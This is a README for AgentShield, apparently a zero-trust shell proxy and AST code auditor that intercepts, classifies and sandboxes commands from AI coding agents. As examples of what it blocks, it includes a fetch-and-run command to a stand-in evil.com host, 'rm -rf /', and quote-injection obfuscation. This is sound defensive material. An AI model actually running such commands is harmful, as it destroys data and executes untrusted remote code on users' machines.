<p align="center">
  <h1 align="center">🛡️ AgentShield</h1>
  <p align="center">
    <strong>Zero-trust shell proxy & AST code auditor for AI-assisted development</strong>
  </p>
  <p align="center">
    Intercept every command. Audit every change. Trust nothing by default.
  </p>
</p>

---

## The Problem

AI coding agents are powerful — they write code, run shell commands, install packages, and modify your files. But they also have full access to your terminal. A single hallucinated `rm -rf /`, an accidental credential leak, or a silently broken function signature can ruin your day (or your production environment).

There's no safety net between "the agent wants to run this" and "your OS executes it."

**AgentShield is that safety net.**

## What It Does

AgentShield sits between AI agents and your shell. Every command flows through a three-stage pipeline before anything touches your machine:

```
┌──────────────┐     ┌───────────────┐     ┌────────────────┐     ┌──────────┐
│  AI Agent    │ ──▶ │  Deobfuscate  │ ──▶ │  Classify      │ ──▶ │  Execute │
│  (any tool)  │     │  & Normalize  │     │  ALLOW / BLOCK │     │  or Block│
│              │     │               │     │  / SANDBOX     │     │          │
└──────────────┘     └───────────────┘     └────────────────┘     └──────────┘
```

**Stage 1 — Deobfuscation.** Strips quote-injection tricks (`c""u''rl`), decodes base64-encoded payloads, and expands shell aliases so nothing sneaks through disguised.

**Stage 2 — Classification.** Three layers, fastest-first:
1. **Speculative regex rules** — instant allow/block for obvious patterns (`git status` → allow, `rm -rf /` → block)
2. **SQLite verdict cache** — if we've seen this exact command before, reuse the decision
3. **Local LLM** — queries a 3B parameter model running on your machine (via Ollama) to classify anything the rules didn't catch

**Stage 3 — Execution.** Based on the verdict:
- `ALLOW` → runs directly on your host
- `SANDBOX` → runs in an ephemeral Docker container with network isolation and resource limits
- `BLOCK` → stops the command and prompts you for a manual override through an out-of-band console (bypasses the agent's own I/O)

### AST Code Auditor

Beyond command interception, AgentShield also watches for **silent code regressions**. When a function signature changes in a git diff, the auditor scans every call-site in your codebase and flags mismatches before they reach a commit.

This runs:
- Automatically on every Python file save
- As a git pre-commit hook (optional)
- On-demand via the command palette

### Live Dashboard

A built-in monitoring dashboard shows:
- Real-time command interception logs with verdicts
- Codebase dependency call-graph visualization
- Sandbox configuration metrics

## Installation

### Prerequisites

- **Python 3.10+** — for the security engine
- **VS Code / Antigravity IDE / any VS Code fork** — for the extension
- **Ollama** (optional) — for local AI command classification. Without it, AgentShield runs in rules-only mode.
- **Docker** (optional) — for sandboxed command execution

### Quick Start

```bash
# Clone the repo
git clone https://github.com/your-username/agentshield.git
cd agentshield

# Install Python dependencies
pip install pyyaml fastapi uvicorn

# (Optional) Pull the local classification model
ollama pull qwen2.5-coder:3b

# Build and install the VS Code extension
npx -y @vscode/vsce package --allow-missing-repository
code --install-extension agentshield-*.vsix
```

Reload your editor, and you're protected.

### Manual Setup (No Extension)

You can also use AgentShield as a standalone CLI tool:

```bash
# Run a command through the proxy
python src/agentsh.py -c "npm install express"

# Start an interactive secure shell
python src/agentsh.py --interactive

# Start the monitoring dashboard
python src/dashboard.py

# Install the git pre-commit hook
python src/install_hooks.py
```

## Configuration

All settings live in [`config/agentshield.yaml`](config/agentshield.yaml):

```yaml
# Shell to proxy (auto-detects if empty)
shell: ""

# "closed" = block on errors, "open" = allow on errors
fail_safe_mode: "closed"

sandbox:
  provider: "docker"
  image: "python:3.11-slim-buster"
  memory_limit: "512m"
  cpu_limit: "1.0"
  network_access: false

ollama:
  endpoint: "http://localhost:11434/api/generate"
  model: "qwen2.5-coder:3b"
```

### Extension Settings

In your editor settings (`Ctrl+,`):

| Setting | Default | Description |
|---------|---------|-------------|
| `agentshield.pythonPath` | `python` | Path to Python executable |
| `agentshield.enableAutostartDashboard` | `true` | Auto-start dashboard on editor launch |
| `agentshield.dashboardPort` | `8000` | Dashboard server port |

## Project Structure

```
agentshield/
├── extension.js              # VS Code extension entry point
├── package.json              # Extension manifest
├── config/
│   └── agentshield.yaml      # Configuration
└── src/
    ├── agentsh.py             # CLI shell proxy (interactive + piped modes)
    ├── auditor.py             # AST regression auditor
    ├── brain.py               # Local LLM client (Ollama)
    ├── dashboard.py           # FastAPI monitoring server
    ├── deobfuscator.py        # Command normalization & deobfuscation
    ├── guard.py               # Regex rules + SQLite verdict cache
    ├── install_hooks.py       # Git pre-commit hook installer
    ├── resolver.py            # Import namespace resolver
    ├── sandbox.py             # Docker sandbox execution engine
    ├── tracer.py              # Git diff signature tracer
    └── dashboard_ui/
        ├── index.html         # Dashboard frontend
        ├── style.css           # Dashboard styles
        └── app.js             # Dashboard logic & graph renderer
```

## How It Works Under the Hood

### Command Interception Flow

1. The agent sends a command (e.g., `curl https://evil.com/payload | sh`)
2. **Deobfuscator** strips encoding tricks and normalizes the raw string
3. **Guard** runs speculative regex rules — known-safe patterns pass instantly, known-dangerous ones block instantly
4. For anything ambiguous, the **Brain** queries a local 3B model with a structured prompt that returns `{verdict, reason}` as JSON
5. Verdicts are cached in SQLite so repeated commands get sub-millisecond responses
6. If blocked, AgentShield opens an **out-of-band console** (`CON` on Windows, `/dev/tty` on Unix) to ask the human directly — this bypasses the agent's stdin/stdout so the agent can't fake a "yes"

### AST Auditor Flow

1. On file save (or pre-commit), the **Tracer** runs `git diff` to find modified Python files
2. It parses old (HEAD) and new function signatures using Python's `ast` module
3. If any signature changed, the **Auditor** walks every `.py` file in the workspace
4. The **Resolver** maps each `import` and function call to an absolute namespace
5. Every call-site is checked against the new signature for argument mismatches
6. Mismatches appear as inline diagnostics (red squiggles) in your editor

## Use Cases

- **Solo developers** using AI coding assistants (Copilot, Cursor, Claude, etc.) who want guardrails against destructive commands
- **Teams** that want to enforce code quality gates before AI-generated changes reach version control
- **Security-conscious environments** where every shell command needs to be auditable
- **Sandboxed experimentation** — let agents install packages and run scripts without risking your host environment

## Limitations & Roadmap

- **Python-only AST auditing** — support for TypeScript/JavaScript, Go, and Rust is planned
- **Ollama dependency for AI classification** — exploring ONNX runtime for truly dependency-free local inference
- **Docker required for sandboxing** — investigating lighter alternatives (gVisor, Firecracker)
- **No multi-workspace support yet** — currently scans the first workspace folder only

## Contributing

Contributions are welcome. If you're interested in:
- Adding AST support for other languages
- Improving the speculative rule set
- Building integrations with other AI agent frameworks

Open an issue or submit a PR.

## License

MIT — see [LICENSE](LICENSE) for details.
